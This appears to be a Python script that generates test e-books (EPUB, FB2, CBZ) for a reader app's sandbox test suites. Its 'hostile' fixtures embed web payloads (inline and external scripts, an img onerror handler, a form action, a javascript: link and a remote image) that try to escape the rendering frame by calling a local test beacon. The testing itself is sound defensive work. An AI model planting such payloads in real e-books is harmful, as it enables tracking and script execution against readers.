#!/usr/bin/env python3
"""Build every fixture the reader's suites open.

Hand-made rather than downloaded, and committed next to this script, so the suites need no network
and no Python to run. Each one exists to answer a specific question:

- `spike.epub`     — long enough to paginate into several columns. A one-screen book would report
                     "the page did not turn" for the wrong reason.
- `hostile.epub`   — the same book whose first chapter tries, four ways, to reach out of the frame
                     it is rendered in. On foliate-js's defaults all four succeeded, in three
                     engines (docs/research/reader-sandbox-spike.md).
- `spike.fb2`      — a second format with a completely different loader: FB2 is XML that the
                     renderer converts to HTML, so "it opens" proves something EPUB cannot.
- `hostile.fb2`    — the same trick in the format where the payload has to survive a conversion.
- `spike.cbz`      — a comic: images rather than text, which is a third rendering path again.

MOBI is deliberately absent; see `docs/plan.md` Phase 11.9 for what that costs and why.

Usage: python3 make-fixtures.py
"""

import pathlib
import struct
import zipfile
import zlib

HERE = pathlib.Path(__file__).parent

PARAGRAPH = (
    "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor "
    "incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud "
    "exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure "
    "dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur."
)

BEACON = "http://127.0.0.1:3101/__beacon"

# --- EPUB ---------------------------------------------------------------------------------------

CONTAINER = """<?xml version="1.0" encoding="utf-8"?>
<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
  <rootfiles>
    <rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/>
  </rootfiles>
</container>
"""

OPF = """<?xml version="1.0" encoding="utf-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="uid">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:identifier id="uid">urn:uuid:00000000-0000-4000-8000-00000000spike</dc:identifier>
    <dc:title>Reader Sandbox Spike</dc:title>
    <dc:language>en</dc:language>
    <dc:creator>Golden Library</dc:creator>
    <meta property="dcterms:modified">2026-08-16T00:00:00Z</meta>
  </metadata>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="ch1" href="ch1.xhtml" media-type="application/xhtml+xml"/>
    <item id="ch2" href="ch2.xhtml" media-type="application/xhtml+xml"/>
    <item id="ch3" href="ch3.xhtml" media-type="application/xhtml+xml"/>
%s  </manifest>
  <spine>
    <itemref idref="ch1"/>
    <itemref idref="ch2"/>
    <itemref idref="ch3"/>
  </spine>
</package>
"""

NAV = """<?xml version="1.0" encoding="utf-8"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Contents</title></head>
  <body>
    <nav epub:type="toc" id="toc">
      <ol>
        <li><a href="ch1.xhtml">Chapter 1</a></li>
        <li><a href="ch2.xhtml">Chapter 2</a></li>
        <li><a href="ch3.xhtml">Chapter 3</a></li>
      </ol>
    </nav>
  </body>
</html>
"""

HOSTILE_SCRIPT = f"""
  try {{ fetch('{BEACON}?via=inline-script'); }} catch (e) {{}}
  try {{ parent.postMessage({{ hostile: 'inline-script' }}, '*'); }} catch (e) {{}}
  try {{ top.postMessage({{ hostile: 'inline-script-top' }}, '*'); }} catch (e) {{}}
  try {{ document.title = 'pwned'; }} catch (e) {{}}
"""

EVIL_JS = f"""
try {{ fetch('{BEACON}?via=external-script'); }} catch (e) {{}}
try {{ parent.postMessage({{ hostile: 'external-script' }}, '*'); }} catch (e) {{}}
"""


def chapter(number: int, paragraphs: int = 40) -> str:
    body = "\n".join(f"    <p>{number}.{i + 1} {PARAGRAPH}</p>" for i in range(paragraphs))
    return f"""<?xml version="1.0" encoding="utf-8"?>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
  <head><title>Chapter {number}</title></head>
  <body>
    <h1>Chapter {number}</h1>
{body}
  </body>
</html>
"""


def hostile_chapter(paragraphs: int = 40) -> str:
    body = "\n".join(f"    <p>H.{i + 1} {PARAGRAPH}</p>" for i in range(paragraphs))
    return f"""<?xml version="1.0" encoding="utf-8"?>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
  <head>
    <title>Hostile</title>
    <script type="text/javascript">{HOSTILE_SCRIPT}</script>
    <script type="text/javascript" src="evil.js"></script>
  </head>
  <body>
    <h1>Hostile chapter</h1>
    <img src="x-does-not-exist.png" onerror="fetch('{BEACON}?via=img-onerror')" alt="" />
    <form action="{BEACON}?via=form" method="get"><input name="a" value="b" /></form>
{body}
  </body>
</html>
"""


def build_epub(target: pathlib.Path, chapters: dict[str, str], extra: dict[str, str]) -> None:
    with zipfile.ZipFile(target, "w", zipfile.ZIP_DEFLATED) as epub:
        # The spec requires `mimetype` first and uncompressed; foliate's zip reader does not care,
        # but a fixture that is invalid in a way real readers reject would make a failure ambiguous.
        epub.writestr(zipfile.ZipInfo("mimetype"), "application/epub+zip", zipfile.ZIP_STORED)
        epub.writestr("META-INF/container.xml", CONTAINER)
        manifest_extra = "".join(
            f'    <item id="{name.replace(".", "-")}" href="{name}" media-type="text/javascript"/>\n'
            for name in extra
        )
        epub.writestr("OEBPS/content.opf", OPF % manifest_extra)
        epub.writestr("OEBPS/nav.xhtml", NAV)
        for name, content in {**chapters, **extra}.items():
            epub.writestr(f"OEBPS/{name}", content)
    print(f"{target.name} ({target.stat().st_size} bytes)")


# --- FB2 ----------------------------------------------------------------------------------------


def fb2(hostile: bool = False) -> str:
    """FB2 is XML the renderer converts to HTML — a different loader and a different attack surface.

    There is no `<script>` element in FB2, so a hostile one has to try what the format *does* allow:
    a `javascript:` link, and an external image URL that would report the reader's IP to whoever
    serves it the moment the section is laid out.
    """
    sections = []
    for number in (1, 2, 3):
        paragraphs = "\n".join(f"      <p>{number}.{i + 1} {PARAGRAPH}</p>" for i in range(40))
        sections.append(f"    <section>\n      <title><p>Chapter {number}</p></title>\n{paragraphs}\n    </section>")
    body = "\n".join(sections)
    trap = (
        f'      <p><a l:href="javascript:fetch(\'{BEACON}?via=fb2-javascript-url\')">tap here</a></p>\n'
        f'      <p><image l:href="{BEACON}?via=fb2-image" /></p>\n'
        if hostile
        else ""
    )
    return f"""<?xml version="1.0" encoding="utf-8"?>
<FictionBook xmlns="http://www.gribuser.ru/xml/fictionbook/2.0" xmlns:l="http://www.w3.org/1999/xlink">
  <description>
    <title-info>
      <book-title>{'Hostile FB2' if hostile else 'Reader Sandbox Spike (FB2)'}</book-title>
      <author><first-name>Golden</first-name><last-name>Library</last-name></author>
      <lang>en</lang>
    </title-info>
  </description>
  <body>
{trap}{body}
  </body>
</FictionBook>
"""


# --- CBZ ----------------------------------------------------------------------------------------


def png(width: int, height: int, grey: int) -> bytes:
    """A valid one-colour PNG, written by hand so the fixture needs no image library."""

    def chunk(kind: bytes, data: bytes) -> bytes:
        return (
            struct.pack(">I", len(data))
            + kind
            + data
            + struct.pack(">I", zlib.crc32(kind + data) & 0xFFFFFFFF)
        )

    raw = b"".join(b"\x00" + bytes([grey, grey, grey]) * width for _ in range(height))
    return (
        b"\x89PNG\r\n\x1a\n"
        + chunk(b"IHDR", struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0))
        + chunk(b"IDAT", zlib.compress(raw))
        + chunk(b"IEND", b"")
    )


def build_cbz(target: pathlib.Path) -> None:
    with zipfile.ZipFile(target, "w", zipfile.ZIP_DEFLATED) as cbz:
        for page in range(1, 7):
            cbz.writestr(f"page{page:02d}.png", png(600, 800, 40 * page % 256))
    print(f"{target.name} ({target.stat().st_size} bytes)")


def main() -> None:
    build_epub(HERE / "spike.epub", {f"ch{n}.xhtml": chapter(n) for n in (1, 2, 3)}, {})
    build_epub(
        HERE / "hostile.epub",
        {"ch1.xhtml": hostile_chapter(), "ch2.xhtml": chapter(2), "ch3.xhtml": chapter(3)},
        {"evil.js": EVIL_JS},
    )
    (HERE / "spike.fb2").write_text(fb2(), encoding="utf-8")
    print(f"spike.fb2 ({(HERE / 'spike.fb2').stat().st_size} bytes)")
    (HERE / "hostile.fb2").write_text(fb2(hostile=True), encoding="utf-8")
    print(f"hostile.fb2 ({(HERE / 'hostile.fb2').stat().st_size} bytes)")
    build_cbz(HERE / "spike.cbz")


if __name__ == "__main__":
    main()
